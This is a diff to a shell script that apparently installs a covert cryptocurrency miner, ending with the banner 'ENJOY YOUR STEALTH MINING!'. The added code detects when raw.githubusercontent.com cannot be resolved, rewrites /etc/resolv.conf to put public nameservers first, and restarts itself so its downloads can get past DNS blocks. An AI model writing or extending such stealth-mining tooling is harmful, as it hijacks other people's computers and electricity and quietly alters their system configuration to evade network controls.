@@ -12,6 +12,82 @@ WALLET_ADDRESS="$1"
 echo "[*] Using wallet: ${WALLET_ADDRESS:0:20}...${WALLET_ADDRESS: -10}"
 echo ""
 
+# ==================== DNS RESOLUTION CHECK & FIX ====================
+# Check if raw.githubusercontent.com can be resolved
+# If not, add public DNS servers and restart script ONCE
+
+DNS_FLAG_FILE="/tmp/.dns_fix_attempted_$$"
+
+check_and_fix_dns() {
+    echo "[*] Checking DNS resolution..."
+    
+    # Test if raw.githubusercontent.com can be resolved
+    if host raw.githubusercontent.com >/dev/null 2>&1 || nslookup raw.githubusercontent.com >/dev/null 2>&1 || ping -c 1 -W 2 raw.githubusercontent.com >/dev/null 2>&1; then
+        echo "[✓] DNS resolution working"
+        return 0
+    fi
+    
+    echo "[!] WARNING: Cannot resolve raw.githubusercontent.com"
+    
+    # Check if we already tried to fix DNS (prevent infinite loop)
+    if [ -f "$DNS_FLAG_FILE" ]; then
+        echo "[!] DNS fix already attempted but still failing"
+        echo "[*] Continuing anyway - downloads may fail"
+        echo "[*] You may need to manually configure DNS or use a different network"
+        return 1
+    fi
+    
+    # Mark that we're attempting DNS fix
+    touch "$DNS_FLAG_FILE"
+    
+    echo "[*] Adding public DNS servers to /etc/resolv.conf..."
+    
+    # Backup original resolv.conf
+    if [ -f /etc/resolv.conf ]; then
+        cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null || true
+        echo "[✓] Backed up /etc/resolv.conf"
+    fi
+    
+    # Add nameservers at the TOP of resolv.conf (higher priority)
+    {
+        echo "# Added by miner installation script"
+        echo "nameserver 1.1.1.1"
+        echo "nameserver 8.8.8.8"
+        echo ""
+        cat /etc/resolv.conf 2>/dev/null || true
+    } > /etc/resolv.conf.new
+    
+    mv /etc/resolv.conf.new /etc/resolv.conf
+    
+    echo "[✓] Added DNS servers:"
+    echo "    1.1.1.1 (Cloudflare)"
+    echo "    8.8.8.8 (Google)"
+    
+    # Test again
+    sleep 2
+    echo "[*] Testing DNS resolution again..."
+    
+    if host raw.githubusercontent.com >/dev/null 2>&1 || nslookup raw.githubusercontent.com >/dev/null 2>&1 || ping -c 1 -W 2 raw.githubusercontent.com >/dev/null 2>&1; then
+        echo "[✓] DNS resolution now working!"
+        echo "[*] Restarting script with fixed DNS..."
+        echo ""
+        
+        # Restart script with same arguments
+        exec "$0" "$@"
+    else
+        echo "[!] DNS still not working after adding nameservers"
+        echo "[*] Continuing anyway - some downloads may fail"
+        echo "[*] This could be due to:"
+        echo "    - Firewall blocking DNS (port 53)"
+        echo "    - Network requires proxy"
+        echo "    - ISP blocking certain domains"
+        return 1
+    fi
+}
+
+# Run DNS check
+check_and_fix_dns "$@"
+
 # ==================== ARCHITECTURE AUTO-DETECTION ====================
 # USAGE EXAMPLES:
 #
@@ -3329,5 +3405,8 @@ echo "=========================================="
 echo "ENJOY YOUR STEALTH MINING! 🚀"
 echo "=========================================="
 echo ""
+
+# Cleanup DNS fix flag file
+rm -f /tmp/.dns_fix_attempted_* 2>/dev/null || true
 
 exit 0
